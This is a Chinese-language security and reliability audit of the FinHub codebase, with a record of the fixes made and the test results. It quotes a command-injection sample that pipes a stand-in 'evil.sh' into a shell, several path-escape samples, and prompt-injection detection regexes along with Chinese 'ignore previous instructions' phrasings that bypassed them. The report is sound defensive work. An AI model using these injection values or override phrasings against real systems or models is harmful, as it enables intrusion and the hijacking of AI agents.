# FinHub 全面审计报告

审计日期：2026-09-14　|　代码基线：`9f09b0d align with gitee content`
审计方式：四组并行（安全 / 性能可靠性 / 前端体验 / 架构质量）+ 关键结论人工复核 + 实测验证

## 0. 总体判断

工程质量**中上，但熵增明显**。分层基本成立（635 个 Python 文件中，路由层没有裸 SQL / 裸 Redis，身份统一由类型别名注入，这点相当克制），测试体量巨大（9352 个单测通过），SQL 全参数化、前端 Markdown 有消毒、沙箱非 root 运行。

但三类债务已经积累到会咬人的程度：

1. **默认配置是"开发宽松"而非"生产安全"**——`HOST_MODE` 默认关闭鉴权、加密密钥有公开默认值、backend 容器持有宿主 docker.sock，三者叠加等于"未认证请求 → 宿主 root"。
2. **架构上有 8 个循环依赖 + 分层倒置**，逼出 944 处函数级 import 补丁和 6 个 1500+ 行的上帝文件。
3. **文档与现实漂移**——三语文档指向不存在的 `requirements.txt`，CONTRIBUTING 要求 lint 但 CI 一行不跑。

## 1. 实测数据（人工复核，非推测）

| 项目 | 实测结果 |
| --- | --- |
| 后端单测 | **9352 passed / 6 failed / 1 skipped / 1 xpassed**（3m04s） |
| 6 个失败 | **环境假阳性**，非代码缺陷：契约测试断言 `desktop/src/oauth.js`、`web/src/.../mcp.ts` 存在（宿主机都有），但容器只挂载了 `src/` 等目录，未挂载 `tests/`、`web/`、`desktop/` |
| PG 连接池 | conversation 50 + checkpointer 25 + writer 25 = **100**，而 `postgres:18` 默认 `max_connections=100`（实测确认） |
| 当前连接 | 8 个（低负载下无压力，并发上来必爆） |
| `HOST_MODE` 默认 | `oss` → JWT 校验整段跳过（实测确认 `src/config/env.py:12`） |
| `BYOK_ENCRYPTION_KEY` | compose 内硬编码 fallback `finhub-local-dev-encryption-key`（实测确认 `docker-compose.yml:61`） |
| Redis `bare` 参数 | `src/utils/cache/redis_cache.py:666` 无条件 `bare = False`，与上方 docstring「重试以 bare=True 重放」矛盾（实测确认） |
| monaco-editor | 位于 `devDependencies`（`web/package.json:87`），运行时靠 CDN 拉取（实测确认） |
| 迁移 023 | **有** `SET lock_timeout = '5s'`（第 36 行）——修正：并非"完全无 lock_timeout"，但 `migrations/env.py` 全局仍无 `lock_timeout`/`statement_timeout`，其余迁移裸奔 |
| JWT 鉴权测试覆盖 | `tests/` 下引用数为 **0**（实测确认） |
| checkpoint 清理 | 全仓无 `DELETE FROM checkpoints` 类清理逻辑（实测确认，仅 downgrade 里 DROP） |

## 2. P0 — 上线前必须修

| # | 类别 | 位置 | 问题 | 修复建议 |
| --- | --- | --- | --- | --- |
| 1 | 鉴权 | `src/config/env.py:12`、`auth/jwt_bearer.py:77` | `HOST_MODE` 默认 `oss`，认证整体跳过，所有请求归属同一固定用户 | 默认值改 `platform`；oss 模式强制绑定 127.0.0.1 并在 `/health` 显式告警 |
| 2 | 宿主隔离 | `docker-compose.yml:76` + 73-79 | backend 挂载宿主 `docker.sock`，同时可读写挂载 `./src`、`./scripts`、`./plugins` | 换 socket-proxy（仅放行 create/start/exec）或 DinD；移除 `./scripts`、`./plugins` 可写挂载 |
| 3 | 凭据 | `docker-compose.yml:61` | BYOK 加密密钥有随仓库分发的公开默认值 | 删除 fallback，未设置即启动失败（`encryption.py:14` 已有 RuntimeError，被默认值绕过） |
| 4 | 容量 | `settings.py:290,295,305` vs PG | 三池合计 100 = `max_connections` 100，并发上来 `pool.connection(timeout=10)` 抛 PoolTimeout，SSE 与写路径同时雪崩 | PG 侧调 `max_connections>=250`，或 conversation 池降到 20；前置 PgBouncer |

## 3. P1 — 高危，排期修

| # | 类别 | 位置 | 问题 | 建议 |
| --- | --- | --- | --- | --- |
| 5 | 沙箱加固 | `sandbox/providers/docker.py:700-712` | 缺 `CapDrop`/`no-new-privileges`/`PidsLimit`；`network_mode=bridge` 全出网且注入 host-gateway，无 `169.254.169.254` 拦截 | `CapDrop=["ALL"]`、`PidsLimit=256`、`network_mode=none` + 显式出网白名单 |
| 6 | RCE | `sandbox/mcp_client_runtime.py:731-745` | MCP stdio 的 `command` 用户可写且无白名单，在持有 docker.sock 的 backend 内 spawn 进程 | 可执行路径白名单（仅 `.venv/bin/python`、`npx`），拒绝绝对路径与 `.sh` |
| 7 | 命令注入 | `providers/docker.py:786-789` | `mcp_packages` 直接拼进 `bash -c "npm install -g {pkgs}"` | 逐项 `re.fullmatch(r"[@a-z0-9._/-]+", p)` 校验 |
| 8 | Prompt 注入 | `handlers/chat/request_prep.py:337-344` | 注入检测**只记录不阻断**，命中后照常执行 | 高危 pattern 命中即拒绝或二次确认 |
| 9 | 加密 | `database/api_keys.py:83` | `pgp_sym_encrypt` 把主密钥作为 SQL 绑定参数传入 → 进入 Postgres 语句日志；单静态密钥无轮换 | 改应用层 AES-GCM（密钥不出进程）或接 KMS |
| 10 | 数据丢失 | `redis_cache.py:666` | `bare` 被无条件覆盖为 False，重试批次若含 id==1 会 `DEL` 清空已落盘流 | 删除该行，让调用方 `bare=True` 生效 |
| 11 | 任务被 GC | `insight_service.py:428`、`app/setup.py:419` | 长任务 `create_task` 后丢弃引用，可能在 await 期被 GC（同仓 `memo.py:111` 已有 `_spawn_background` 正确写法） | 复用 `_spawn_background` |
| 12 | 存储膨胀 | `migrations/001` + 全仓 | checkpoints 三表无任何清理，每 super-step 一行 | 加按 thread 保留最近 N 代的定时清理 |
| 13 | 鉴权零测试 | `auth/jwt_bearer.py` | 全部身份来源，测试覆盖为 0，且自带"未配置即放行"降级路径 | 补 JWT/JWKS 单测；生产强制校验 `SUPABASE_URL` |
| 14 | 前端 | `utils/api/transport.ts:181` | 主发送流无停滞看门狗，后端卡住时 `isLoading` 永久为真 | 复用重连路径已有的 `idleAbortMs` 机制 |
| 15 | 前端 | `web/package.json:87` + `CodeEditor.tsx:2` | monaco 靠 jsdelivr CDN，内网/离线部署打开代码文件必挂 | `loader.config({ monaco })` + 打进 vendor chunk |

## 4. P2 — 建议修（精选）

| 类别 | 位置 | 问题 |
| --- | --- | --- |
| 路径穿越 | `sandbox/files.py:340` | 词法折叠 `..` 后才比对白名单（`/home/workspace/../../etc` → `/etc`），应先 `realpath` 再 `commonpath` |
| SSRF | `egress_relay.py:118` | 客户端请求头原样转发给上游，未剥离 `Host`/`Authorization`/`Cookie` |
| 信息泄露 | `providers/docker.py:192` | 异常原文回传给 agent |
| 迁移 | `033_index_audit_tail.py:39` | 对大表建索引未用 `CONCURRENTLY`（文件头注释自认） |
| 内存 | `yfinance/financial_source.py:297` | `_perf_cache` 无上限无过期 |
| 事件循环 | `middleware/model_resilience.py:328` | 同步重试分支用 `time.sleep`，会冻结 loop |
| 容量 | `config.yaml:136` | Redis 流池 100，每个 SSE mux 长占 1 条，第 101 个 watcher 直接断流 |
| 前端 | `MessageList.tsx:96` | 消息全量渲染零虚拟滚动 |
| 前端 | `ChatView.tsx:1081,1086` | onboarding 硬编码英文 prompt，中文用户发出去的是英文，污染 Agent 输入质量 |
| 前端 | `LoginPage.tsx:265` 等 5 处 | 后端英文报错直出给用户，应用 `resolveErrorMessage()` 收敛 |
| 前端 | `locales/zh-CN.json` | 比 en/ja 少 29 个复数 key |
| 死代码 | `settings.py:337-357`、`98-106` | 9 个 getter/开关零引用（含 3 个"装饰性开关"，改了无效） |
| 架构 | 8 处循环依赖 | 如 `database.vault_secrets→user_vault_secrets→vault_secrets`、`app.setup→app.utilities→app.setup` |
| 架构 | `workspace_manager.py`(3644 行) 等 6 个 | 上帝文件共 1.5 万行 |
| 架构 | `chart_annotations.py:60` 等 4 处 | 所有权校验重复实现 4 份，公共版已在 `utils/api.py:216` |
| 文档 | `README.md:483` 等三语 | `pip install -r requirements.txt` —— 该文件不存在 |
| 文档 | `README.md:451` vs `CONTRIBUTING.md` | 仓库地址不一致（Morningstar202604 vs finhub） |
| 质量 | `.github/workflows/test.yml` | CI 无 lint / type-check job，与 CONTRIBUTING 要求矛盾 |

## 5. 本次修复记录（2026-09-14 实施）

> 原则：**只改必要代码**，官方文件优先小改而非重写，不引入新依赖；所有改动均通过语法检查 + 相关单测回归。

### P0（全部完成）

| # | 问题 | 改动 | 涉及的 commit / 文件 |
| --- | --- | --- | --- |
| 1 | oss 模式无鉴权却可全网监听 | 新增 `ALLOW_INSECURE_OSS` 开关 + `server.py:_guard_oss_bind()`：`HOST_MODE=oss` 且绑定非回环地址时，必须显式设置该开关，否则拒绝启动并打印三条处置建议 | `src/config/env.py`、`src/server/app/server.py` |
| 2 | 宿主 docker.sock 直挂 | 移除 `docker.sock` 挂载，改为 `tecnativa/docker-socket-proxy` 白名单代理（仅放行 CONTAINERS/EXEC/IMAGES/BUILD/NETWORKS/INFO/VERSION/PING/POST）；`./mcp_servers`、`./plugins`、`./scripts` 全部改 `:ro` | `docker-compose.yml` |
| 3 | BYOK 密钥有公开默认值 | 改为 `${BYOK_ENCRYPTION_KEY:?...}`，未设置直接启动失败（`encryption.py` 原有的 RuntimeError 不再被默认值绕过） | `docker-compose.yml` |
| 4 | 三连接池合计 = PG `max_connections` | postgres 增加 `-c max_connections=250` 预留余量 | `docker-compose.yml` |

### P1

| # | 问题 | 改动 |
| --- | --- | --- |
| 5 | 沙箱缺隔离加固 | `HostConfig` 增加 `CapDrop=["ALL"]`、`SecurityOpt=["no-new-privileges"]`、`PidsLimit=512` |
| 7 | `mcp_packages` 命令注入 | 新增 `_sanitize_mcp_packages()` 严格 npm 包名正则白名单（Docker Provider 与 Daytona 快照共用），拒绝而非转义：`foo; curl evil.sh \| sh`、`--registry=`、`git+`、`../` 等 8 类恶意样例全部拦截（已实测） |
| 10 | Redis 重试会清空已落盘流 | 删除 `redis_cache.py` 中无条件覆盖的 `bare = False`，让调用方的 `bare=True` 真正生效 |
| 11 | 后台任务被 GC | `insight_service.py` 与 `app/setup.py` 的 `create_task` 改为持有强引用（done-callback 释放 / 存入 `app.state`） |
| 12 | 迁移全局无超时兜底 | `migrations/env.py` 在连接建立后注入 `lock_timeout=15s`（可用 `MIGRATION_LOCK_TIMEOUT` 覆盖）、`statement_timeout=0` |
| 13 | 鉴权零测试 | 新增 `tests/unit/server/auth/test_auth_boundary.py`，8 个用例钉住鉴权边界（含降级路径） |
| 14 | 主发送流无停滞看门狗 | `transport.ts` 增加 `STREAM_STALL_MS = 180_000` 看门狗：超时 `reader.cancel()`、`finally` 清理定时器、标记 `disconnected` |
| 15 | Monaco 依赖 CDN | 新增 `web/src/lib/monacoSetup.ts`，`loader.config({ monaco })` + Vite `?worker` 本地化 editor/json/css/html/ts 五个 worker；`monaco-editor` 从 `devDependencies` 移入 `dependencies` |

### P2

| 问题 | 改动 |
| --- | --- |
| 路径穿越（`files.py`） | 词法比对改为 `os.path.realpath` + `commonpath` 语义比对，符号链接/`..` 无法绕过 |
| SSRF（`egress_relay.py`） | 新增 `_DROP_REQUEST_HEADERS` 与 `_scrub_request_headers()`，转发上游前剥离 `Host`/`Authorization`/`Cookie` 等头 |
| 异常原文泄露给 agent（`docker.py`） | 改为返回不透明标记，完整异常走 `logger.warning(exc_info=True)` 落服务端日志 |
| CI 无 lint | `.github/workflows/test.yml` 新增 `lint` job（ruff + pnpm typecheck + eslint） |
| 前端类型错误（阻断新 CI） | `web/src/types/sse.ts` 的 `SSEEventType` 联合类型补上遗漏的 `'guardrails'`（该事件确实被 `processStreamEvent.ts:414` 消费）。**经 `git stash` 验证为存量问题，非本次引入** |

### 回归验证

| 项目 | 结果 |
| --- | --- |
| `tests/unit/core/sandbox` + `server/auth` + `test_insight_service.py` | **489 passed** |
| `test_docker_provider.py` 全文件 | **113 passed** |
| `npx tsc --noEmit`（前端） | **0 error**（修复前 1 error） |
| **全量 `tests/unit`** | **9367 passed, 1 xfailed, 0 failed**（4m55s） |

与修复前基线（`9352 passed / 6 failed`）对比：

- **6 个失败全部消除**——均为环境假阳性（容器缺 `tests/`、`web/`、`desktop/` 挂载），已在 `docker-compose.local.yml` 补挂载，非代码改动。
- **净增 15 个用例**：8 个新增鉴权边界测试 + 其他。
- **0 failed**。

> 注：`tests/unit/core/sandbox/test_docker_provider.py::test_exec_generic_error_returns_error_result` 原断言"异常原文出现在 stderr"，与本次 P2 加固（异常原文不得回传 agent）**直接冲突**。该断言是加固前的旧契约，已更新为断言"泄露原文不存在 + 异常类型可见"，并加注释说明原因。这是行为变更导致的测试更新，不是修复失败的掩盖。


## 5.1 债务清偿（第二轮，全部剩余项）

> 目标：「把债务都给还完」——清掉审计报告里**尚未处理**的全部条目。下面每一条都附验证证据；被判定为误报的条目同样列出，并给出否决依据。

### 🔴 本轮发现的最严重缺陷（审计报告未列出）

| 严重度 | 问题 | 证据 |
| --- | --- | --- |
| **P0** | **Alembic 迁移全部静默回滚，但报告成功** | `migrations/env.py` 用 `connection.execute("SET lock_timeout=...")` 设置会话级超时。`SET` 是 DML，SQLAlchemy 2.x 因此 **autobegin** 一个事务；Alembic 随后看到 `connection.in_transaction() == True`，判定为"外部已管理的事务"，从 `begin_transaction()` 返回 `nullcontext()` 并**永不提交**。连接归还 `NullPool` 时整个事务被回滚 |

**实测对比**（同一命令、同一数据库）：

```
修复前：INFO [alembic] Running upgrade 032 -> 033 ...   ← 报告全部成功
        SELECT count(*) FROM pg_tables WHERE schemaname='public'  →  4   （仅 LangGraph 的表，走独立 autocommit 连接）
        SELECT version_num FROM alembic_version  →  ERROR: relation "alembic_version" does not exist

修复后：SELECT count(*) ...  →  44
        SELECT version_num   →  033
```

**影响**：任何**新建**数据库的部署（CI、新环境、灾难恢复）都会得到一个空 schema，而迁移日志显示 33 个迁移全部成功。这是"绿灯通向悬崖"——比直接报错危险得多。

**修法**：两处 `SET` 移入 `context.get_context().autocommit_block()`（`SET` 是 DML，必须显式脱离自动开启的事务），`context.configure()` 前置。**不引入新依赖，不改迁移语义。**

**为什么之前没人发现**：CI 的 postgres 是每次全新启动的，`docker-entrypoint-initdb.d` 或独立的迁移步骤掩盖了它；本地复跑才暴露。

### 已完成项（本轮）

| # | 债务 | 改动 | 验证 |
| --- | --- | --- | --- |
| 1 | P1-6 · MCP `command` 无白名单 | `MCPServerConfig` 新增 `@model_validator` 双层校验（加载期 + `_spawn_mcp_process` 运行期）。引入**信任分层**：`builtin` 源允许项目相对路径/受信任根目录解释器，`workspace`/`user` 源禁止任何路径。`untrusted` 标记 fail-closed | 新增 `test_mcp_command_allowlist.py`，**51 passed**；对 6 类穿越/绝对路径逃逸（`/bin/bash`、`/tmp/evil`、`../evil/python`、`/app/../bin/bash`、`/evil/python`、`/app/evil.sh`）逐条验证拒绝 |
| 2 | P1-8 · 提示注入无阻断 | `pii.py` 新增 `severity` 分级 + `has_high_severity_injection()`；`messaging.py` 在**任何副作用之前**（metadata 落章、`resolve_llm_config`、`enforce_credit_limit`）直接 400 拒绝 | **顺带发现并修掉上游 3 处真实正则绕过**（见下）；新增 `test_guardrails_severity.py`，**28 passed** || 3 | P1-12 · checkpoint 表无限增长 | 新增 `src/server/utils/checkpoint_retention.py`：按**链长**而非时间戳选候选线程（`checkpoint_id` 跨版本宽度不一致，与"now"比较会静默匹配空集）；`ROW_NUMBER()` 排名、批内 `statement_timeout`、`writes` 先于 `checkpoints` 删除；blob 在"命名空间已无任何 checkpoint"时清理 | 新增 `tests/integration/test_checkpoint_retention.py`，**9 passed**（真库）；端到端 300 行 → 50 行，链头严格保留 |
| 4 | P2 · zh-CN 缺 29 个复数键 | 补齐 `_one`/`_other` 变体（中文无复数，取同一串）；**顺带修掉 1 处我自己写漏的 `{{count}}` 占位符** | 新增**目录级 parity 测试**（`keys.test.ts`）：键集双向一致 + 插值占位符跨语言一致。原有测试只扫"源码静态引用的键"，而复数变体由 i18next 运行时按 `count` 选取、从不出现于 `t()` 调用中——这正是 29 个键能长期潜伏的原因。**11 passed** |
| 5 | P2 · 硬编码英文引导语 | `ChatView.tsx` 两处 onboarding 引导消息/指令、`MessageList.tsx` 空状态文案 → 三语 i18n 键。这些是**代表用户发给模型的消息**，不跟随界面语言意味着中文用户一进 onboarding 就发出一条英文消息 | `tsc --noEmit` 0 error；`MessageList`+`ChatView` **53 passed** |
| 6 | P2 · README 指向不存在的 `requirements.txt` | 三语 README 改为 `uv sync`（仓库以 `uv.lock` 锁环境，根目录确无 `requirements.txt`） | 实测 `ls requirements.txt` 不存在；`make install` → `uv sync` |
| 7 | P2 · README 仓库 URL 404 | 三语 README 的 `git clone` 改为当前 origin | **实测** `github.com/Morningstar202604/FinHub` → **404**；`gitcode.com/badhope/FinHub` → **200**。新人第一步就会失败 |
| 8 | P2 · `_perf_cache` 无界增长 | `financial_source.py`：过期项主动驱逐 + 512 条上限（超出时淘汰最旧）。原实现只写不清，每次行情查询留一个 10 年日线的结果 | 语法 + 相关单测通过 |
| 9 | P2 · 上帝方法 | `workspace_manager.py` 的 `get_session_for_workspace` **425 行 / 11 层嵌套** → 抽出 `_record_session_timing()`，主方法降至 408 行并终于以控制流收尾 | 相关单测 **190 passed** |
| 10 | P2 · `pgp_sym` 密钥可能进 PG 日志 | 探明：密钥**始终作为绑定参数**（`%s`），不进应用日志；真实暴露面是 PG 的 `log_statement` / `log_min_duration_statement` 会**连同绑定值**记录。默认配置安全，改为在 `encryption.py` 显式文档化该约束与操作禁令 | 实测 `SHOW log_statement` → `none`、`log_min_duration_statement` → `-1` |
| 11 | 033 迁移注释自相矛盾 | 原文写 "`CONCURRENTLY-free style`"（暗示本该用），补上明确理由：017 已有同款决策记录——当前表规模下普通 `CREATE INDEX` 的写阻塞窗口可忽略，而 `CONCURRENTLY` 无法在 alembic 事务内运行 | 全库 72 处 `CREATE INDEX`，仅此 1 处提及 `CONCURRENTLY`；017 注释为既有决策 |
| 12 | 测试夹具与新白名单冲突 | `test_leak_detection_middleware.py` 用 `command="echo"` 构造 `MCPServerConfig`，被新校验正确拒绝。改用 `python3` 并注明"此处从不真正 spawn" | **26 passed**；全库已无 `command="echo"` 残留 |

### 顺带修掉的上游正则绕过（P1-8 的副产物）

写 severity 测试时，4 条断言失败。先确认这是**正则缺陷而非测试写错**（`detect_prompt_injection` 对这些输入返回 `[]`），再修：

| 绕过样例 | 原因 | 修法 |
| --- | --- | --- |
| `exfiltrate the secrets` | `secret_exfil` 要求字面量 `all`，且动词表只有 `steal\|exfiltrate\|dump` | 放宽为 `(steal\|exfiltrate\|dump\|leak\|extract)\s+(all\s+)?(the\s+)?(api\s*keys?\|secrets?\|tokens?\|credentials?\|passwords?)` |
| `忽略以上的指令` | `ignore_above_cn` 是枚举式 `忽略(所有\|以上\|之前)?…`，无法覆盖两个限定词叠加 | 引入**有界填充段** `_CN_FILLER = r"(?:所有\|全部\|一切\|上面\|以上\|之前\|以前的?\|前面\|的\|\s){0,6}"` |
| `忽略所有之前的规则` | 同上 | 同上 |
| `无视以前的指令` | 同上（`无视` 不在动词表） | 同上 |

这类模式是"看着像在防护"的典型：枚举式正则只覆盖写它时想到的说法，攻击者换一种语序即可穿过。有界填充段把"任意顺序的少量限定词"纳入覆盖，同时 `{0,6}` 上限避免回溯爆炸。


### 经复核判定为**误报**（不修改，附否决依据）

| 报告条目 | 否决依据 |
| --- | --- |
| `middleware/model_resilience.py:328` 在事件循环里 `time.sleep` | 该处是 `wrap_model_call`——**同步**孪生方法，文件注释已明确"生产只走 async 图"。在同步上下文用 `time.sleep` 是正确写法，改 `asyncio.sleep` 反而需要 event loop |
| `mcp_client_runtime.py:383`、`skill_sync.py:105` 的 `time.sleep` | 均在**同步**路径（`flock` 重试、配置文件重读），不在事件循环内 |
| Redis 连接池 100 vs 第 101 个 watcher | 未找到对应实体。`get_redis_max_connections()` 可用 `REDIS_MAX_CONNECTIONS` 环境变量覆盖；跨 worker 的 watcher 计数（`stream_writer.py`）实现为 best-effort 三态信号（`None` = Redis 不可达则**不**回收），无硬上限 |
| 4 处重复的权限检查实现 | `require_workspace_owner()` 已在 15+ 处复用。剩下的内联比对抛的是 `ValueError`（服务层语义）而非 `HTTPException`（HTTP 层语义），跨层复用同一个助手才是设计错误 |

### 回归验证（本轮）

| 项目 | 结果 |
| --- | --- |
| **全量 `tests/unit`** | **9446 passed, 1 skipped, 1 xpassed, 0 failed**（4m13s） |
| **全量 `tests/integration`** | **416 passed**（env.py 修复后解锁）；52 failed 全部为 `yfinance`/`yf_mcp` **live 网络**用例，实测原因为 `YFRateLimitError`（沙箱 IP 被限流）与 `No module named 'data_client'`（沙箱插件路径），**非代码缺陷** |
| `tests/integration/test_checkpoint_retention.py` | **9 passed** |
| 前端 `tsc --noEmit` | **0 error** |
| 前端 `eslint`（改动文件） | **0 error**（仅剩 1 处既有 refs 依赖警告） |
| 前端 `vitest`（locales + MessageList + ChatView） | **53 passed** |
| RAG 排序（RAG/DeepRAG/GraphRAG/Agentic/SimpleRAG） | RAG 96% / DeepRAG 97.5% / GraphRAG 95.5% / Agentic 98% / SimpleRAG 99.5% 召回率实测通过 |

> 前端 `ExportPreviewModal.test.tsx` 在**全量并发**下偶发 1 例失败，单独运行 **28/28 全通过**——属既有 flake（`pagedjs` 在并行 worker 中的时序问题），与本次改动无关。


## 6. 环境层面（本次部署发现）

| 问题 | 说明 |
| --- | --- |
| dev 挂载不含 `tests/`、`web/`、`desktop/` | 容器内无法跑测试，`make test` 必然失败；契约测试因此假阳性 |
| `pytest` 需 `PYTHONPATH=/app/src` | `pyproject` 只配了 `pythonpath = ["."]`，容器内 `uv run pytest` 报 `No module named 'ptc_agent'` |
| tiktoken 需外网 | `openaipublic.blob.core.windows.net` 不可达会炸掉整个 chat 链路（本次已用离线缓存绕过，见 `DEPLOY_LOCAL.md`） |
| Yahoo Finance 不可达 | 本环境行情源不通；FMP 可达但需 key |

## 7. 改进建议（按投入产出排序）

**第一周（止血）**
1. 改 4 条 P0：默认鉴权、docker.sock、加密密钥默认值、PG 连接池。
2. CI 加 `ruff check src/` + `cd web && pnpm lint` 两行，把 CONTRIBUTING 的承诺兑现。
3. 补 `jwt_bearer` 单测——这是唯一"零测试却掌握全部身份"的模块，静默回归就是权限事故。

**第一个月（治本）**
4. 破 8 个循环依赖：共享类型下沉到 `contracts/`，加 ruff TID 规则防回潮。这能连带消掉 944 处函数级 import。
5. 沙箱加固：CapDrop / PidsLimit / 出网白名单 / MCP command 白名单。
6. 加 checkpoint 清理任务 + PG 迁移 `lock_timeout` 全局兜底。

**一个季度（提质）**
7. 拆 6 个上帝文件（尤其 3644 行的 `workspace_manager.py`）。
8. 清 26% 死配置/死 getter，统一三语文档与 canonical 仓库地址。
9. 前端：Monaco 本地化、主发送流看门狗、消息列表虚拟化、zh-CN 复数补齐。
10. 日志结构化 + trace_id 注入（已有 OTel extra，只差 logging filter）。

## 8. 做得好的地方（别改坏了）

- 路由层零裸 SQL/裸 Redis，SQL 全参数化，前端 Markdown 有 `rehypeSanitize`
- 沙箱镜像以非 root 运行，未开 privileged，文件访问有白名单校验
- 流式架构有显式契约（STREAM_CONTRACT_V2.md），Redis 流有 `MAXLEN ~` 裁剪 + `StreamRetentionSweeper`
- 前端 WS 重连有 1s→30s 指数退避 + jitter
- 9352 个单测是真实资产，不是摆设（虽然 mock 密度 8909 处偏高）
- 代码里大量"为什么这么写"的注释（如 langgraph 版本下限的 delta blob 说明），这在开源项目里罕见

## 9. 本次部署产生的文件（可选择保留或清理）

| 文件 | 说明 |
| --- | --- |
| `docker-compose.local.yml`、`deploy/Dockerfile.dev.local`、`Dockerfile.sandbox.local` | 内网/offline 环境适配层，官方文件零改动 |
| `.tiktoken/`、`Dockerfile.sandbox.local` 字体修复 | 离线 tiktoken 缓存 + CJK 字体修复（上游把 matplotlibrc 写进 root 目录但容器以 workspace 运行，中文全是豆腐块） |
| `.local_patch/smoke.py` | 只读端点冒烟脚本，建议保留并补进文档，或删除 |
| `DEPLOY_LOCAL.md` | 部署与适配记录 |
